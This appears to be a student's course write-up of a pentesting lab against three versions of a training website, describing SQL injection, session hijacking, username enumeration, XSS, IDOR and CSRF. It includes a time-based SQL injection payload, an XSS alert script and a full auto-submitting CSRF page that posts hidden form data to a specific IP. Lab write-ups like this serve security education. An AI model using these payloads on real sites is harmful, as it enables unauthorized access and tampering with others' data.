# Project 8 - Pentesting Live Targets

Time spent: 8 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: SQL Injection (SQLi)

Description:

1) The Attacker is Injects a sql command instead of the proper Salesperson's ID Number.
2) Injected SQL Command:
		%27%20OR%20SLEEP(5)=0--%27
3) This causes the Database command to wait for 5 seconds while quering the data.

<img src="blue-vuln1.gif">

Vulnerability #2: Session Hijacking/Fixation 

Description: 

1) The Victim's session ID is obtained through the tool that is provided by the codepath
2) Using burp, we can intercept the attacker's access attempt to and secure site
3) From the intercepted packet, we can modify the session ID to the one we obtained from the Victim
4) Once the packet is forwarded, the attacker is logged in using the Victim's session ID

<img src="blue-vuln2.gif">

## Green

Vulnerability #1: Username Enumeration

Description: When using a non-existent username and a random password, the site's error message states "Log in was unsuccessful." However, when using an existing/valid username and a random password, it shows the same error message, but in bold.

<img src="green-vuln1.gif">

Vulnerability #2: Cross-Site Scripting (XSS)

Description: A attacker can generate a XSS by putting a alert script in the feedback description while writing a feedback. 

<script>alert('Tejashw found A XSS! Alert');</script>

<img src="green-vuln2.gif">

## Red

Vulnerability #1: Insecure Direct Object Reference (IDOR)

Description: An IDOR attack can be performed if id=10 or id=11 in the url. This will shows that the salesperson that has been fired or not available. This IDOR attack will help the user see the salesperson database.   

<img src="red-vuln1.gif">

Vulnerability #2: Cross-Site Request Forgery (CSRF)

Description: A attacker can update or delete a data from the database by creating a malicous website. 

Sample code used by me:

<html>
  <head>
    <title>Crsf attack</title>
  </head>
  <body onload="document.my_form.submit()">
  <h1>Some random important content</h1>
  <h2>definitely not a trap.</h2>
    <form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=2" method="POST" name="my_form" style="display: none;" >
      <input type="hidden" name="csrf_token" value=""><br>
      <input type="text" name="first_name" value="noname"><br>
      <input type="text" name="last_name" value="hacker" ><br>
      <input type="text" name="phone" value="892-367-2328"><br>
      <input type="text" name="email" value="hacker@sample.com">
      <br>
    </form>
  </body>
</html>

Using this simple html code, I was able to change the data info of the salesman whose id was 2. 

<img src="red-vuln2.gif">


## Notes

Describe any challenges encountered while doing the work

When I was doing the CSRF, I install a software called XAMPP so that I can a run local web server. I was able to do it with Xampp as its has Apache Web Server. 